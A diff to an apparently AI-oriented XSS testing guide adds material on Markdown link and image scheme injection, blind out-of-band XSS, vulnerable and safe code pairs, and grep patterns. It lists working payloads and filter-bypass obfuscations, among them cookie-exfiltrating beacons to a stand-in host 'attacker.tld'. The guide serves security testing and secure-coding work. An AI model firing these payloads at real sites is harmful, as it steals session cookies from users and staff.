@@ -1,6 +1,6 @@
 ---
 name: xss
-description: XSS testing covering reflected, stored, and DOM-based vectors with CSP bypass techniques
+description: XSS testing covering reflected, stored, DOM-based, blind (out-of-band stored), and Markdown-rendering (link/image URI scheme injection) vectors with CSP bypass techniques
 ---
 
 # XSS
@@ -27,7 +27,7 @@ Cross-site scripting persists because context boundaries, parser behavior, and f
 ## Where to Look
 
 **Types**
-- Reflected, stored, and DOM-based XSS across web, mobile, and desktop shells
+- Reflected, stored, DOM-based, and blind (out-of-band stored, rendered in a privileged/internal viewer) XSS across web, mobile, and desktop shells
 
 **Contexts**
 - HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF
@@ -226,8 +226,109 @@ Maintain a compact, context-tuned set:
 
 ### Markdown/Richtext
 
-- Many renderers pass HTML through by default; plugins may re-enable raw HTML output
-- Sanitize after rendering; prohibit inline HTML or constrain to a minimal safe element set
+Rendering user-supplied Markdown to HTML has **two independent XSS surfaces** — and the second one fires even when raw/inline HTML is fully disabled, so "HTML is off" is not a sufficient defense.
+
+**(A) Raw/inline HTML passthrough** — the renderer emits author-supplied `<script>`, `<img onerror=…>`, etc. verbatim. Triggered by enabling raw HTML or re-adding it via a plugin:
+- `marked(input)` (older defaults) / `marked.parse(input)` without a post-sanitize step
+- `markdown-it({ html: true })` (off by default; the flag turns the hole on)
+- `showdown` with no output sanitizer; `snarkdown` (no sanitizer at all)
+- `commonmark`/`commonmarker` with `UNSAFE` / `allowDangerousHtml`
+- remark/rehype pipelines using `rehype-raw` or `dangerouslySetInnerHTML` on the rendered string; `react-markdown` with `rehypePlugins:[rehypeRaw]` or a `skipHtml:false` + raw plugin
+- Python `markdown.markdown(input)` then `| safe` / `Markup(...)` (autoescape bypassed)
+
+**(B) Dangerous URI scheme in link/image targets** — `[text](URL)` becomes `<a href="URL">` and `![alt](URL)` becomes `<img src="URL">`. If the renderer does not allowlist the URL scheme, a navigation/load executes script. This is the dominant Markdown-specific vector and **survives `html:false`**:
+- Link href: `[x](javascript:alert(1))`, `[x](vbscript:alert(1))`
+- Image/link to an HTML data URI: `![x](data:text/html;base64,PHNjcmlwdD4uLi48L3NjcmlwdD4=)`
+- Autolink form: `<javascript:alert(1)>`
+- Reference-style definition: `[ref]: javascript:alert(1)` then `[x][ref]`
+
+**Scheme obfuscation a denylist misses** (normalize/decode before allowlisting — never match the literal string `javascript:`):
+- Whitespace/tab/newline split inside the scheme: `j a v a s c r i p t:`, `java\nscript:`
+- HTML entities (named/dec/hex), whole or partial: `&#x6A;…`, `&#106;…`, `Javas&#99;ript:`
+- Mixed case: `JaVaScRiPt:`
+- `javascript://%0d%0aalert(1)` — the `//` + CRLF turns the host portion into a comment so the payload still runs
+- Leading control chars / `\x00`-`\x1f` before the scheme
+- Title/alt breakout into an attribute: `![a]("onerror="alert(1))`, `![a](https://h/i.png"onload="alert(1))`
+
+**SAST signal**: user-controlled text reaches a Markdown→HTML renderer and the result is emitted into the DOM (`innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `| safe`, `Html.Raw`) **without** (a) raw HTML disabled AND (b) an output HTML sanitizer that allowlists URL schemes after decoding. Relying on the renderer's own `sanitize` option is a finding — it is deprecated/removed in current `marked` and absent in several libraries.
+
+```javascript
+// VULN — raw HTML on, no post-sanitize: <script>/<img onerror> pass straight through
+const html = marked.parse(userMarkdown);            // older marked: HTML enabled
+el.innerHTML = html;
+
+// VULN — html:false still renders [x](javascript:...) / ![x](data:text/html,...) as live href/src
+const md = require("markdown-it")({ html: false });
+el.innerHTML = md.render(userMarkdown);
+
+// SAFE — render with raw HTML off, then sanitize output and allowlist URL schemes
+import DOMPurify from "dompurify";
+const md = require("markdown-it")({ html: false, linkify: true });
+const dirty = md.render(userMarkdown);
+el.innerHTML = DOMPurify.sanitize(dirty, {
+  ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i,   // reject javascript:/vbscript:/data:
+});
+```
+
+```python
+# VULN — output marked safe, so javascript: links and any raw HTML execute
+from markupsafe import Markup
+import markdown
+return Markup(markdown.markdown(user_text))
+
+# SAFE — render, then run an allowlist sanitizer (e.g. nh3/bleach) that drops
+#        non-http(s) schemes and disallowed tags/attributes after decoding
+import markdown, nh3
+html = markdown.markdown(user_text)
+return nh3.clean(html, url_schemes={"http", "https", "mailto"})
+```
+
+**Grep seeds** — Markdown render reaching an HTML sink, dangerous flags, or no sanitizer:
+```bash
+# renderers + dangerous raw-HTML flags
+rg -n "marked\(|marked\.parse|markdown-it|new Remarkable|showdown|snarkdown|react-markdown|rehype-raw|commonmark|markdown\.markdown" --glob '*.{js,jsx,ts,tsx,py,rb,go}'
+rg -n "html:\s*true|allowDangerousHtml|dangerouslySetInnerHTML|UNSAFE|skipHtml:\s*false|rehypeRaw" --glob '*.{js,jsx,ts,tsx}'
+# rendered markdown emitted raw, and whether a sanitizer is present nearby
+rg -n "DOMPurify\.sanitize|sanitize-html|nh3|bleach\.clean|ALLOWED_URI_REGEXP" --glob '*.{js,jsx,ts,tsx,py}'
+```
+
+## Blind XSS (Out-of-Band Stored)
+
+Blind XSS is **stored XSS where the payload executes in a different, often privileged, viewing context the attacker never directly sees** — and the attacker gets **no reflected response** at injection time. The input is persisted/logged at a low-trust (frequently unauthenticated) entry point and rendered raw later in an internal tool. Severity is usually high: it fires in the session of a staff/admin user.
+
+**Render contexts where it fires** (the value is emitted into an HTML sink here, not where it was submitted): admin dashboards, support/helpdesk agent consoles, moderation queues, log viewers / SIEM / analytics UIs, generated reports / PDF exports, monitoring and internal CRUD tools.
+
+**Source surfaces distinctive to blind XSS** — values that look harmless at ingest but get displayed raw in an internal view, and are easy to miss because they are not obvious form fields:
+- Request headers logged then shown to staff: `User-Agent`, `Referer`, `X-Forwarded-For`, `Origin`, custom client headers
+- Support/contact/feedback tickets, abuse reports, order notes, appointment/comment fields
+- Signup/profile metadata surfaced in admin (display name, company, address, bio)
+- Filenames and upload metadata listed in an admin file browser
+- Webhook/integration payloads and API client/app names rendered in a dashboard
+- Exception/error messages and audit-log entries surfaced in an admin console
+- **Received-email content rendered by webmail / mail clients**: SMTP headers and message bodies are fully sender-controlled. Webmail that renders the `List-Unsubscribe` URL as a clickable unsubscribe link/button, or displays sender display names / message HTML, turns the email into a stored-XSS source — e.g. a `List-Unsubscribe: <javascript://host/%0aalert(document.domain)>` header emitted into an `<a href>` (see URL-scheme sinks). The viewer (recipient) is a different principal than the attacker (sender)
+
+**SAST signal — store-here / render-elsewhere across a trust boundary**: the **write** sink (persist or log) and the **read/render** sink live in *different* templates, apps, or privilege tiers, and the render side **skips contextual encoding because the data is assumed internal/trusted**. Detect by correlating an untrusted ingest → store/log step with a *separate* privileged view that emits the stored value into an HTML sink without encoding. A raw HTML sink in an admin/internal template fed by user-originated stored or logged data is the finding even when no attacker-facing reflection exists.
+
+```python
+# VULN (ingest): request header logged verbatim from an unauthenticated endpoint
+log_entry.user_agent = request.headers.get("User-Agent")   # attacker-controlled
+db.session.add(log_entry)
+
+# VULN (render, different template / admin app): emitted raw into the staff log viewer
+# admin/access_log.html  ->  <td>{{ entry.user_agent | safe }}</td>   # fires in admin session
+```
+
+**Grep seeds** — pair an untrusted ingest/log with a raw render in an admin/internal view:
+```bash
+# user-originated values persisted/logged (header & support-field sources)
+rg -n "User-Agent|Referer|X-Forwarded-For|getHeader\(|headers\[|ticket|feedback|contact|user_agent" --glob '*.{py,js,ts,java,go,rb,php}'
+# raw HTML sinks inside admin/internal/staff templates rendering stored values
+rg -n "\| ?safe|\| ?raw|innerHTML|v-html|dangerouslySetInnerHTML|th:utext|\{!! ?.* ?!!\}|Html\.Raw" --glob '*{admin,internal,staff,dashboard,report,log}*'
+```
+
+**Confirmation is out-of-band (OAST)**: the payload beacons to an attacker-controlled collaborator (e.g. `<img src=//attacker.tld/b?c='+document.cookie>` or a `fetch`) when an internal user opens the view — there is no response to the attacker's own request. PoC must use a callback, not `alert()`.
+
+**SAFE**: contextually encode at **every** render sink regardless of source trust; never treat headers, logs, support tickets, or "internal-only" fields as pre-trusted; apply CSP / Trusted Types to admin and internal apps too (not just the public app). Cross-ref `content_security_policy.md`.
 
 ## Special Contexts
 
@@ -276,9 +377,11 @@ Maintain a compact, context-tuned set:
 |----------|---------|-----------------|
 | Reflected (HTML body) | `?q=<img src=x onerror=alert(1)>` or `<script>alert(1)</script>` | Unescaped markup/script in response body; alert or DOM node injection |
 | Stored | Submit `<img src=x onerror=fetch('//attacker.tld?c='+document.cookie)>` via profile/comment field; reload as victim | Payload persists and executes for other users |
+| Blind (out-of-band) | Inject `<img src=//attacker.tld/b?u='+document.cookie>` via a header (`User-Agent`/`Referer`), support ticket, or signup field that staff later view | OAST callback fires from an internal/admin session; no reflection in attacker's own response |
 | DOM-based (hash) | Visit `/#<img src=x onerror=alert(1)>` | Script runs client-side with no server echo; check `location.hash` → sink trace |
 | Attribute context | `" autofocus onfocus=alert(1) x="` | Breaks out of quoted attribute; event fires on focus |
 | `javascript:` URL | `javascript:alert(1)` in href/src/action param | Navigation or iframe load executes JS |
+| Markdown link/image scheme | `[x](javascript:alert(1))`, `![x](data:text/html;base64,…)`, `<javascript:alert(1)>` in a Markdown field | Renderer emits live `href`/`src`; click/load runs JS even with raw HTML disabled |
 
 Use `fetch('//attacker.tld/log?'+document.cookie)` instead of `alert()` for impact PoCs. Capture response Content-Type — HTML sinks require `text/html`; JSON responses are not XSS unless a client parses and injects them.
 
@@ -406,6 +509,7 @@ Auto-escaping protects HTML *text/attribute* context but NOT a URL that is later
 - **VULN**: `<a href={userUrl}>` / `window.location = userUrl` / `location.href = userUrl` / `el.src = userUrl` where `userUrl` may be `javascript:...` or `data:text/html,...`
 - **VULN**: `<iframe src={userUrl}>`, `<form action={userUrl}>`, `<object data={userUrl}>`, `el.setAttribute('href', userUrl)`
 - **VULN**: serving/returning fetched or uploaded **SVG** inline (`image/svg+xml` or `text/html`) — SVG executes inline script; see Image-Proxy SSRF in `ssrf.md`
+- **VULN**: the `userUrl` originates from **non-HTTP-request input** — e.g. a URL parsed from a received email/SMTP header (`List-Unsubscribe`) and emitted as an unsubscribe `<a href>` by a webmail UI; the same `javascript:`/`data:` scheme injection applies and the obfuscation variants above (`javascript://host/%0a…`) bypass naive denylists
 - **Note**: React blocks `javascript:` in JSX URL props (warns since 16.9), but `data:` URLs, non-React DOM writes, and `setAttribute` still execute; do not assume the framework covers this.
 - **SAFE**: validate scheme against an allowlist before use — `if (!/^https?:/i.test(url)) reject()`; React JSX `<div>{userInput}</div>` for non-URL text
 
